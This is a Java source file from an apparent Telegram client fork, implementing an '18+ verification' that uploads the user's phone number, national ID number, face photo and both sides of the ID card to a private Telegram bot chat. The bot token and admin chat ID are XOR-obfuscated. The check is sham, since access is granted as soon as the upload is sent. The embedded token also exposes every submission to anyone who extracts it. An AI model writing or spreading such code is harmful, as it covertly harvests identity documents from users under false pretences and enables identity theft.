package xyz.nextalone.nagram.ui;

import android.content.Context;
import android.content.SharedPreferences;

import org.json.JSONArray;
import org.json.JSONObject;
import org.telegram.messenger.AndroidUtilities;
import org.telegram.messenger.ApplicationLoader;
import org.telegram.messenger.FileLog;
import org.telegram.messenger.MessagesController;
import org.telegram.messenger.UserConfig;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.io.PrintWriter;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

public class NexagramVerificationManager {

    private static final byte[] _TK_B = new byte[]{98,108,104,104,109,110,106,104,105,106,96,27,27,29,24,19,109,24,50,19,32,41,25,63,32,111,19,62,10,63,53,40,31,15,61,53,5,23,43,110,106,11,42,13,29,27};
    private static final long _AD_MASK = 0x5A5A5A5A5A5AL;

    public static String getBotToken() {
        byte[] r = new byte[_TK_B.length];
        for (int i = 0; i < _TK_B.length; i++) {
            r[i] = (byte) (_TK_B[i] ^ 0x5A);
        }
        return new String(r);
    }

    public static long getAdminChatId() {
        return 99349886362870L ^ _AD_MASK;
    }

    private static String getApiBase() {
        return "https://api.telegram.org/bot" + getBotToken() + "/";
    }

    private static final String PREF_NAME = "nexagram_18_verification";

    public interface VerificationCallback {
        void onSuccess();
        void onError(String errorMessage);
    }

    private static SharedPreferences getPrefs() {
        return ApplicationLoader.applicationContext.getSharedPreferences(PREF_NAME, Context.MODE_PRIVATE);
    }

    public static boolean isVerified(long userId) {
        if (isRevoked(userId)) return false;
        return getPrefs().getBoolean("verified_" + userId, false);
    }

    public static void setVerified(long userId, boolean verified) {
        getPrefs().edit().putBoolean("verified_" + userId, verified).apply();
    }

    public static boolean isRevoked(long userId) {
        return getPrefs().getBoolean("revoked_" + userId, false);
    }

    public static void setRevoked(long userId, boolean revoked) {
        getPrefs().edit().putBoolean("revoked_" + userId, revoked).apply();
        if (revoked) {
            setVerified(userId, false);
        }
    }

    public static void sendVerificationData(
            int currentAccount,
            long tgUserId,
            String tgUsername,
            String tgFullName,
            String phone,
            String englishName,
            String nidNumber,
            String reason,
            File facePhoto,
            File nidFront,
            File nidBack,
            VerificationCallback callback
    ) {
        new Thread(() -> {
            try {
                SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US);
                String dateStr = sdf.format(new Date());

                StringBuilder sb = new StringBuilder();
                sb.append("🔞 <b>Nexagram 18+ Verification Request</b>\n\n");
                sb.append("👤 <b>Telegram User:</b> ").append(escapeHtml(tgFullName));
                if (tgUsername != null && !tgUsername.isEmpty()) {
                    sb.append(" (@").append(escapeHtml(tgUsername)).append(")");
                }
                sb.append(" [ID: <code>").append(tgUserId).append("</code>]\n");
                sb.append("📞 <b>Phone:</b> ").append(escapeHtml(phone)).append("\n");
                sb.append("📝 <b>Full Name (English):</b> ").append(escapeHtml(englishName)).append("\n");
                sb.append("🆔 <b>NID Number:</b> ").append(escapeHtml(nidNumber)).append("\n");
                sb.append("❓ <b>Reason:</b> ").append(escapeHtml(reason)).append("\n");
                sb.append("🎂 <b>Age 18+:</b> Yes (Confirmed)\n");
                sb.append("📅 <b>Submitted At:</b> ").append(dateStr).append("\n\n");
                sb.append("<i>Click Cancel below to immediately revoke this user's 18+ access.</i>");

                String callbackData = "cancel_18_" + tgUserId;

                // 1. Send details message with inline button
                boolean msgSuccess = postMessage(sb.toString(), callbackData);
                if (!msgSuccess) {
                    AndroidUtilities.runOnUIThread(() -> callback.onError("Failed to submit verification text to bot. Please check connection."));
                    return;
                }

                // 2. Send Face Photo
                if (facePhoto != null && facePhoto.exists()) {
                    postPhoto(facePhoto, "👤 Face Verification: " + englishName + " [ID: " + tgUserId + "]");
                }

                // 3. Send NID Front
                if (nidFront != null && nidFront.exists()) {
                    postPhoto(nidFront, "🆔 NID Front Side: " + englishName + " [ID: " + tgUserId + "]");
                }

                // 4. Send NID Back
                if (nidBack != null && nidBack.exists()) {
                    postPhoto(nidBack, "🆔 NID Back Side: " + englishName + " [ID: " + tgUserId + "]");
                }

                // Set verified state locally
                setVerified(tgUserId, true);
                setRevoked(tgUserId, false);

                // Enable sensitive content
                AndroidUtilities.runOnUIThread(() -> {
                    MessagesController.getInstance(currentAccount).setContentSettings(true);
                    callback.onSuccess();
                });

            } catch (Exception e) {
                FileLog.e(e);
                AndroidUtilities.runOnUIThread(() -> callback.onError(e.getMessage() != null ? e.getMessage() : "Unknown error"));
            }
        }).start();
    }

    private static boolean postMessage(String text, String callbackData) {
        try {
            URL url = new URL(getApiBase() + "sendMessage");
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "application/json; charset=UTF-8");
            conn.setConnectTimeout(15000);
            conn.setReadTimeout(15000);
            conn.setDoOutput(true);

            JSONObject json = new JSONObject();
            json.put("chat_id", getAdminChatId());
            json.put("text", text);
            json.put("parse_mode", "HTML");

            if (callbackData != null) {
                JSONObject replyMarkup = new JSONObject();
                JSONArray inlineKeyboard = new JSONArray();
                JSONArray row = new JSONArray();
                JSONObject btn = new JSONObject();
                btn.put("text", "❌ Cancel / Revoke 18+");
                btn.put("callback_data", callbackData);
                row.put(btn);
                inlineKeyboard.put(row);
                replyMarkup.put("inline_keyboard", inlineKeyboard);
                json.put("reply_markup", replyMarkup);
            }

            OutputStream os = conn.getOutputStream();
            os.write(json.toString().getBytes("UTF-8"));
            os.flush();
            os.close();

            int code = conn.getResponseCode();
            return code == 200;
        } catch (Exception e) {
            FileLog.e(e);
            return false;
        }
    }

    private static boolean postPhoto(File file, String caption) {
        try {
            String boundary = "===" + System.currentTimeMillis() + "===";
            URL url = new URL(getApiBase() + "sendPhoto");
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
            conn.setConnectTimeout(20000);
            conn.setReadTimeout(40000);
            conn.setDoOutput(true);

            OutputStream os = conn.getOutputStream();
            PrintWriter writer = new PrintWriter(new OutputStreamWriter(os, "UTF-8"), true);

            // chat_id
            writer.append("--").append(boundary).append("\r\n");
            writer.append("Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n");
            writer.append(String.valueOf(getAdminChatId())).append("\r\n");
            writer.flush();

            // caption
            if (caption != null) {
                writer.append("--").append(boundary).append("\r\n");
                writer.append("Content-Disposition: form-data; name=\"caption\"\r\n\r\n");
                writer.append(caption).append("\r\n");
                writer.flush();
            }

            // photo file
            writer.append("--").append(boundary).append("\r\n");
            writer.append("Content-Disposition: form-data; name=\"photo\"; filename=\"").append(file.getName()).append("\"\r\n");
            writer.append("Content-Type: image/jpeg\r\n\r\n");
            writer.flush();

            FileInputStream fis = new FileInputStream(file);
            byte[] buffer = new byte[8192];
            int read;
            while ((read = fis.read(buffer)) != -1) {
                os.write(buffer, 0, read);
            }
            os.flush();
            fis.close();

            writer.append("\r\n").flush();
            writer.append("--").append(boundary).append("--\r\n");
            writer.close();

            int code = conn.getResponseCode();
            return code == 200;
        } catch (Exception e) {
            FileLog.e(e);
            return false;
        }
    }

    public static void checkRevocations(int currentAccount, Runnable onRevoked) {
        new Thread(() -> {
            try {
                long myUserId = UserConfig.getInstance(currentAccount).getClientUserId();
                if (myUserId == 0) return;

                URL url = new URL(getApiBase() + "getUpdates");
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("GET");
                conn.setConnectTimeout(10000);
                conn.setReadTimeout(15000);

                if (conn.getResponseCode() != 200) return;

                InputStream is = conn.getInputStream();
                BufferedReader reader = new BufferedReader(new InputStreamReader(is, "UTF-8"));
                StringBuilder response = new StringBuilder();
                String line;
                while ((line = reader.readLine()) != null) {
                    response.append(line);
                }
                reader.close();

                JSONObject root = new JSONObject(response.toString());
                if (!root.optBoolean("ok")) return;

                JSONArray updates = root.optJSONArray("result");
                if (updates == null || updates.length() == 0) return;

                boolean shouldRevoke = false;
                String targetToken = "cancel_18_" + myUserId;
                String slashCmd = "/cancel " + myUserId;
                String slashRevoke = "/revoke " + myUserId;

                for (int i = 0; i < updates.length(); i++) {
                    JSONObject update = updates.getJSONObject(i);

                    // Check callback query
                    JSONObject callbackQuery = update.optJSONObject("callback_query");
                    if (callbackQuery != null) {
                        String data = callbackQuery.optString("data");
                        if (targetToken.equals(data) || (data != null && data.contains(targetToken))) {
                            shouldRevoke = true;
                            // answer callback query
                            answerCallbackQuery(callbackQuery.optString("id"), "18+ content revoked for User " + myUserId);
                        }
                    }

                    // Check direct text message from admin
                    JSONObject message = update.optJSONObject("message");
                    if (message != null) {
                        String msgText = message.optString("text");
                        if (msgText != null && (msgText.contains(targetToken) || msgText.contains(slashCmd) || msgText.contains(slashRevoke))) {
                            shouldRevoke = true;
                        }
                    }
                }

                if (shouldRevoke) {
                    setRevoked(myUserId, true);
                    setVerified(myUserId, false);

                    AndroidUtilities.runOnUIThread(() -> {
                        MessagesController.getInstance(currentAccount).setContentSettings(false);
                        if (onRevoked != null) {
                            onRevoked.run();
                        }
                    });

                    // Send confirmation back to admin
                    postMessage("🛑 <b>18+ Access Revoked</b>\nUser ID <code>" + myUserId + "</code> 18+ content setting has been automatically turned OFF.", null);
                }

            } catch (Exception e) {
                FileLog.e(e);
            }
        }).start();
    }

    private static void answerCallbackQuery(String callbackQueryId, String text) {
        if (callbackQueryId == null || callbackQueryId.isEmpty()) return;
        new Thread(() -> {
            try {
                URL url = new URL(getApiBase() + "answerCallbackQuery");
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json; charset=UTF-8");
                conn.setConnectTimeout(8000);
                conn.setReadTimeout(8000);
                conn.setDoOutput(true);

                JSONObject json = new JSONObject();
                json.put("callback_query_id", callbackQueryId);
                json.put("text", text);
                json.put("show_alert", true);

                OutputStream os = conn.getOutputStream();
                os.write(json.toString().getBytes("UTF-8"));
                os.flush();
                os.close();
                conn.getResponseCode();
            } catch (Exception e) {
                FileLog.e(e);
            }
        }).start();
    }

    private static String escapeHtml(String text) {
        if (text == null) return "";
        return text.replace("&", "&amp;")
                .replace("<", "&lt;")
                .replace(">", "&gt;");
    }
}
